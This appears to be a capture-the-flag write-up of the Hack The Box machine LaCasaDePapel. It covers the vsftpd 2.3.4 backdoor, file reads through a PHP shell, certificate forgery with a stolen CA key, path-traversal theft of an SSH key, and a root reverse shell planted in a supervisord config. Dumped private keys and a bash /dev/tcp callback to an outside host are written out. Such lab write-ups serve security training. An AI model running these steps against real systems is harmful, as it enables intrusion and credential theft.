---
layout: post
title: "lacasadepapel"
date: 2025-09-25 
categories: OSCP Playlist
---
# lacasadepapel

# Summary

- exploit backdoor on ftp v2.3.4 manually
- get psy shell, can file read, get ca.key from dir
- create client certificate from ca.key and public key from https site cert
- https site has LFI vulnerability, retrieved private key from user professor
- pspy to capture running processes, to find a root process using a file we control to run commands
- inject bash shell, get root reverse shell

# Attack Path

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/lacasadepapel 10.10.10.131

21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
|_http-title: La Casa De Papel
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
Service Info: OS: Unix
```

We get the domain name from the TLS cert. Let’s add that to our /etc/hosts:

```bash
10.10.10.131 lacasadepapel.htb
```

Let’s see if ftp allow anon login:

```bash
ftp 10.10.10.131
```

Denied.

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image.png)

Let’s fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.131/FUZZ -ic
```

Nothing.

Let’s capture the request from when demand a free trial:

```bash
GET /qrcode?qrurl=otpauth%3A%2F%2Fhotp%2FToken%3Fsecret%3DPU6FKUKKHBQTMWB3KJ4TCZSLOY4TANCK%26algorithm%3DSHA1 HTTP/1.1
Host: 10.10.10.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.10.131/
Priority: u=4, i

```

Decoded URL is:

```bash
otpauth://hotp/Token?secret=PU6FKUKKHBQTMWB3KJ4TCZSLOY4TANCK&algorithm=SHA1
```

Not much more to do.

HTTPS:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%201.png)

Let’s fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://10.10.10.131/FUZZ -fs 44
```

Nothing. Let’s search for subdomains:

```bash
ffuf -u http://10.10.10.131 -H "Host: FUZZ.lacasadepapel.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 1754
```

Nothing.

Let’s do more scan:

```bash
rustscan -a 10.10.10.131 --ulimit 5000
```

No additional ports.

Searching up the ftp version vsftpd 2.3.4, we find that there is a backdoor will open on port 6200 if :) is supplied as the username.

Let’s use metasploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.131
```

Does not work.

Let’s do this manually, first connect to ftp:

```bash
ftp 10.10.10.131
#username :)
```

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%202.png)

Now another terminal, we use nc to connect to port 6200:

```bash
nc 10.10.10.131 6200
```

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%203.png)

We get a Psy Shell

PsySH (often typed as "psyshell") is an interactive REPL (Read-Eval-Print Loop) shell for PHP, allowing you to execute code, inspect variables, and debug interactively.

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%204.png)

We attempt to use edit to try and write code:

```bash
edit

PHP Warning:  proc_open() has been disabled for security reasons in phar:///usr/bin/psysh/src/Command/EditCommand.php on line 162
PHP Warning:  proc_close() expects parameter 1 to be resource, null given in phar:///usr/bin/psysh/src/Command/EditCommand.php on line 163
```

Disabled.

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%205.png)

We can use rlwrap for a better shell:

```bash
rlwrap nc 10.10.10.131 6200
```

Now, our goal should be to upgrade our shell. We can use phpinfo() to find what functions are disabled:

```bash
phpinfo()
```

Now search for disable_functions

```bash
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

However, we can read directories and files using scandir() and file_get_contents() respectively. 

```bash
scandir("/home")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]

scandir("/home/berlin")
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]

scandir("/home/berlin/.ssh")
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1

scandir("/home/dali/.ssh")
=> [
     ".",
     "..",
     "authorized_keys",
     "known_hosts",
   ]

file_get_contents("/home/dali/server.js")
=> """
   const net = require('net')\n
   const spawn = require('child_process').spawn\n
   \n
   const server = net.createServer(function(socket) {\n
       const sh = spawn('/usr/bin/psysh')\n
       sh.stdin.resume()\n
       sh.stdout.on('data', function (data) {\n
           socket.write(data)\n
       })\n
       sh.stderr.on('data', function (data) {\n
           socket.write(data)\n
       })\n
       socket.on('data', function (data) {\n
   \ttry {\n
             sh.stdin.write(data)\n
   \t}\n
   \tcatch(e) {\n
   \t  socket.end()\n
   \t}\n
       })\n
       socket.on('end', function () {\n
       })\n
       socket.on('error', function () {\n
       })\n
   });\n
   \n
   server.listen(6200, '0.0.0.0');\n
```

We see that server.js which is in dali’s home dir is serving the psyshell. 

We go into user nairobi’s home dir, and found the ca.key:

```bash
   file_get_contents("/home/nairobi/ca.key")
   
 -----BEGIN PRIVATE KEY-----\n
 MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
 2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
 uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
 YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
 s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
 PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
 Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
 1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
 /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
 q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
 uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
 I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
 7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
 G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
 sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
 CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
 sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
 ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
 zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
 ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
 9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
 WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
 7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
 aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
 53udBEzjt3WPqYGkkDknVhjD\n
 -----END PRIVATE KEY-----\n

```

Clean the cert up:

```bash
sed 's/\\n/\n/g; s/^ *//' dirty.key > ca.key
```

Let’s save this ca private key. Now that we have the CA key we can use this to create a client certificate. First, we have to verify whether this is the CA private key to the HTTPS website. We visit port 443. Be sure to turn off burp at this point as it will interfere with exporting the correct certificate:

and click on the lock icon:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%206.png)

We then click More information, a tab will pop up, where we can select to view the site certificate:

Now we can scroll down to the Download section, and download the cert pem:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%207.png)

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%208.png)

Now let’s verify whether the private key we obtained is the key pair to the public key contained in the cert we downloaded:

```bash
#generate public key from private key
openssl pkey -in ca.key -pubout | openssl md5

#ouptut public key from the x509 cert
openssl x509 -in lacasadepapel-htb.pem -pubkey -noout | openssl md5

71e2b2ca7b610c24d132e3e4c06daf0c
```

Now the private key is verified, let’s generate the client certificate:

```bash
openssl genrsa -out client.key 4096

#create a signing request
openssl req -new -key client.key -out client.req

#sign the rqeuest with ca key
openssl x509 -req -in client.req -CA lacasadepapel-htb.pem -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer

#now generate the certificate
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```

To recap, we are generating a private key → making a CSR → getting it signed by a CA → bundling it into a `.p12` file.

Now let’s import it to firefox; go on firefox → go to Settings →Privacy & Security →View Certificates.

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%209.png)

Now click import and upload the .p12 cert to Your Certificates:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2010.png)

Now visit the https page again:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2011.png)

We can click on the seasons and click a file to download. Capture the request with burp:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2012.png)

```bash
GET /file/U0VBU09OLTIvMDUuYXZp HTTP/1.1
Host: 10.10.10.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.10.10.131/?path=SEASON-2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```

We also realise the encoding used for the file is just base64:

```bash
echo 'U0VBU09OLTIvMDUuYXZp' | base64 -d
SEASON-2/05.avi
```

In the URL we see a path parameter; let’s see if it’s vulnerable to LFI:

```bash
https://10.10.10.131/?path=/etc/
```

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2013.png)

Looks like it’s using scandir in the backend. 

```bash
https://10.10.10.131?path=../../../../../home
```

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2014.png)

Let’s combine everything together, since we are probably user berlin (as we are in his home dir), let’s see his .ssh dir

```bash
https://10.10.10.131/?path=../.ssh
```

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2015.png)

We should not use burp here as it crashes the box. Let’s just use curl:

```bash
curl -k https://10.10.10.131/file/$(echo -n "../.ssh/id_rsa" | base64)

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Let’s save this to a file and attempt to use this to login to berlin via ssh:

```bash
chmod 600 berlin.key

ssh -i berlin.key berlin@10.10.10.131
```

Did not work. Maybe this is not berlin’s key. Let’s check all other users. Eventually, user professor logged us in:

```bash
ssh -i berlin.key professor@10.10.10.131
```

The shell we land on looks slightly different, let’s check what shell this is:

```bash
lacasadepapel [~]$ echo $SHELL
/bin/ash
```

Initial enumeration:

```bash
lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) groups=1002(professor)
lacasadepapel [~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for professor: 
```

We upload linpeas for ease of enumeration:

```bash

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.23

4460 root      0:00 {supervisord} /usr/bin/python2 /usr/bin/supervisord --nodaemon[0m --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf

3158 memcache  0:00 /usr/bin/memcached -d -p 11211 -U 11211 -l 127.0.0.1 -m 64 -c 1024 -u memcached -P /var/run/memcached/memcached-11211.pid

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -

╔══════════╣ Users with console                                                                                                                          
berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash                          
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh                          
operator:x:11:0:operator:/root:/bin/sh                                      
postgres:x:70:70::/var/lib/postgresql:/bin/sh                               
professor:x:1002:1002:professor,,,:/home/professor:/bin/ash                 
root:x:0:0:root:/root:/bin/ash 

╔══════════╣ Installed Compilers
/usr/bin/gcc

══╣ Possible private SSH keys were found!
/home/nairobi/node_modules/http-signature/http_signing.md

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 114K Jun 14  2018 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
---s--x--x 1 root root 9.8K Jun 22  2018 /usr/bin/abuild-sudo
---s--x--x 1 root root 14K Sep 27  2018 /bin/bbsuid
-rwsr-xr-x 1 root root 30K Jul 30  2018 /bin/fusermount

════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
	
/usr/bin/findssl.sh 

```

Let’s also transfer pspy to see what’s cron jobs are running:

```bash
wget http://10.10.16.7:8001/pspy64_2018   #try this version if the stripped is not working

chmod +x pspy64_2018
./pspy64_2018
2025/09/25 22:57:19 CMD: UID=65534 PID=13652  | /usr/bin/node /home/professor/memcached.js 
2025/09/25 22:56:00 CMD: UID=0    PID=13540  | /sbin/openrc-run /etc/init.d/supervisord restart 
2025/09/25 22:56:00 CMD: UID=0    PID=13539  | /sbin/openrc-run /etc/init.d/supervisord restart 
2025/09/25 22:56:00 CMD: UID=0    PID=13542  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord stop 
2025/09/25 22:56:00 CMD: UID=0    PID=13545  | 
2025/09/25 22:56:00 CMD: UID=0    PID=13549  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord stop 
2025/09/25 22:56:00 CMD: UID=0    PID=13548  | 
2025/09/25 22:56:00 CMD: UID=0    PID=13557  | start-stop-daemon --stop --exec /usr/bin/supervisord --pidfile /var/run/supervisord.pid 
2025/09/25 22:56:00 CMD: UID=0    PID=13564  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 
2025/09/25 22:56:00 CMD: UID=0    PID=13566  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 
2025/09/25 22:56:00 CMD: UID=0    PID=13579  | start-stop-daemon --start --exec /usr/bin/supervisord --pidfile /var/run/supervisord.pid --background --make-pidfile -- --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf 
2025/09/25 22:56:00 CMD: UID=0    PID=13580  | start-stop-daemon --start --exec /usr/bin/supervisord --pidfile /var/run/supervisord.pid --background --make-pidfile -- --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf 
2025/09/25 22:56:01 CMD: UID=0    PID=13582  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 
2025/09/25 22:56:01 CMD: UID=0    PID=13587  | /usr/bin/python2 /usr/bin/supervisord --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf 
2025/09/25 22:56:02 CMD: UID=0    PID=13588  | sudo -u nobody /usr/bin/node /home/professor/memcached.js 

2025/09/25 22:58:01 CMD: UID=0    PID=13715  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 
2025/09/25 22:58:02 CMD: UID=0    PID=13721  | sudo -u nobody /usr/bin/node /home/professor/memcached.js 
```

We find in our home dir a memcached.ini

```bash
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

This looks like the command being executed by root. Maybe it’s running the file from memcached.ini. Since memcached.ini is in our home dir, we can rename it and create a new file with its name and edit that.

```bash
mv memcached.ini new
touch memcached.ini
cat new > memcache.ini
```

Now we can edit with vi, let’s put a reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"
#Now memcache.ini looks like
[program:memcached]
command = bash -c "bash -i >& /dev/tcp/10.10.16.7/4444 0>&1"

```

Now start a listener:

```bash
nc -lnvp 4444
```

We are now root:

![image.png]({{ site.baseurl }}/assets/lacasadepapel//image%2016.png)